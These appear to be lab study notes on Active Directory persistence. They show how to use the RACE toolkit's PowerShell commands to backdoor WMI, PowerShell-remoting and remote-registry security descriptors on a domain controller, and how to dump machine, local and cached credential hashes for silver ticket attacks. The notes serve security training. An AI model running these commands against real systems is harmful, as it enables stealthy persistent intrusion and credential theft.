It is possible to modify Security Descriptors of multiple remote access methods (securable object) to allow access to non-admin users.
- They are security information like owner, primary group, DACL, and SACL.
- So we could use that to access to machines without privileges.

This works as a very useful and impactful backdor mechanism.

>[!warning] Domain Admin Priv are required to do that.


Security Descripto Definition Language defines the format which is used to describe a security descriptor.
SDDL uses ACE strings for DACL and SACL:
- `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`

# 1. BUILT in admin for WMI namespace ACE

The ACE for built in administrators for WMI namespaces is:
```c
A;CI;CCDCLCSWRPWPRCWD;;;SID
```
- `A` is allow
- `CI` is continuer inherit
- `CCDCLCSWRPWPRCWD` are the permissions
- `SID` is the sid of the user

>[!important] 
>If we copy this ACE and we put our `SID` at the end we can have the access to the target machine using WMI without privileges.

We can do it using `RACE toolkit` [https://github.com/samratashok/RACE]

## 1.1 Modify ACL using race tollkit to add Sec descripto Administrator

We can easily do:
```powershell 
. C:\AD\Tools\RACE.ps1
```

On the local machine for `student555`
```powershell
Set-RemoteWMI -SamAccountName student555 -verbose
```



### 1.2 Add Sec descriptor Administrator on domain controller

On remote machine for `student555` without explicit creds
```powershell
Set-RemoteWMI -SamAccountName student555 -computername dcorp-dc -namespace 'root\cimv2' -verbose
```
- We will now be able to use WMI to run command on domain controller
- ![[Pasted image 20261125110403.png]]
- ![[Pasted image 20261125110414.png]]

>[!important] There is no detection at all so it's a fantastic attack



On remote machine for `student555` with explicit creds
```powershell
Set-RemoteWMI -SamAccountName student555 -computername dcorp-dc -credential Administrator -namespace 'root\cimv2' -verbose
```

#### Remove the permissions
On rempte machine we can use it to remove the permissions:
```powershell
Set-RemoteWMI -SamAccountName student555 -computername dcorp-dc  -namespace 'root\cimv2' -Remove -verbose
```


### Check if we can talk to WMI
To check if we can talk with a remote machine using `WMI` we can use:
```powershell
gwmi -class win32_operatingsystem -computername dcorp-dc
```
- ![[Pasted image 20261125105341.png]]


# 2. Powershell remoting security descriptor 

We can also use these sec descriptors to give privileges on our PS remoting.

>[!note] RACE toolkit for PS remoting backdoor is not stable after august 202 patches
## 2.1 Add privileges 
On a local machine we can use :
```powershell
Set-RemotePSRemoting -SamAccountName student555 -verbose
```

## For a remote machine (domain controller ex)

```powershell
Set-RemotePSRemoting -SamAccountName student555 -computerName dcorp-dc -verbose
```
- ![[Pasted image 20261125111414.png]]
- if you get a I/O error it's not a problem, it's fine

If it works, we can try to access the `dcorp-dc` now:

```powershell 
Enter-PSSession -ComputerName dcorp-dc -verbose
```
- In this case we can see it works.
- ![[Pasted image 20261125111544.png]]


### 2.1.1 Remove permissions

To remove the permissions we can do:
```powershell
Set-RemotePSRemoting -SamAccountName student555  -computerName dcorp-dc - Remove -verbose
```

# 3. Remote Registry to steal `domain controller` credentials

In this case  we leverage on the remote registry. What we do is to get the credentials of the domain controller in order to connect and run commands on the remote machine `dcorp-dc`.


## 3.1 Add Remote registry descriptors using RACE or DAMP

First of all we need to load `RACE`:
```powershell
. C:\AD\Tools\RACE.ps1
```

We can use `RACE` or `DAMP` with admin priv on a remote machine to add remote registry descriptors:
```powershell
Add-RemoteRegBackdoor -computername dcorp-dc -Trustee student555 -verbose
```
- ![[Pasted image 20261125112513.png]]
- We can see that it modifies various registry keys

### 3.1.2 Retrieve secrets hashes 

First of all we need to load `RACE`:
```powershell
. C:\AD\Tools\RACE.ps1
```

Then we can try to steal the machine account hash of a remote machine:
```powershell
Get-RemoteMachineAccountHash -computername dcorp-dc -verbose
```
- ![[Pasted image 20261125112720.png]]
- We could retrieve a `rc4` hash but we need to check it.

>[!warning] What we can do with the `dcorp-dc` machine hash?
>We can use it to perform a  silver ticket attack and access to `WMI` for example.
>Host: ![[Pasted image 20261125113223.png]]
>RPCSS: ![[Pasted image 20261125113239.png]]
>WMI exec: ![[Pasted image 20261125113307.png]]
>

To retrieve local account hash of a remote machine we can do:
```powershell
Get-RemoteLocalAccountHash -computername dcorp-dc -verbose
```

To retrieve all the cached credential hash of a remote machine we can do:
```powershell
Get-RemoteCachedCredential -computername dcorp-dc -verbose
```
